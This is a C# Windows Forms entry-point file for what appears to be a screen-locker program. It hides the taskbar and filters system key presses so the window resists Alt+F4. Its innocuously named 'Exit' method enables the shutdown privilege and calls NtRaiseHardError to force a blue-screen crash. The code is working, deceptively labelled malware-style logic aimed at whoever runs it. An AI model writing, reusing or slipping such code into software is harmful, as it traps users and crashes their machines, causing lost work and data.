using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Generic
{
    public class PreventKeyboardInput : IMessageFilter
    {
        public bool PreFilterMessage(ref Message m)
        {

            // Intercept Alt+F4
            if (m.Msg == 0x0104)
            {
                return true;
            }

            return false; // Allow other messages
        }
    }

    internal static class Sys32
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
            out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters,
            uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);


        private const int SW_HIDE = 0;

        public static void HideTaskbar()
        {
            IntPtr taskbarHandle = FindWindow("Shell_TrayWnd", null);
            ShowWindow(taskbarHandle, SW_HIDE); // Hide taskbar
        }

        public static unsafe void Exit()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

    }

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Sys32.HideTaskbar();

            Application.EnableVisualStyles();
            Application.AddMessageFilter(new PreventKeyboardInput()); // Add the global filter
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainWindow());
        }
    }
}
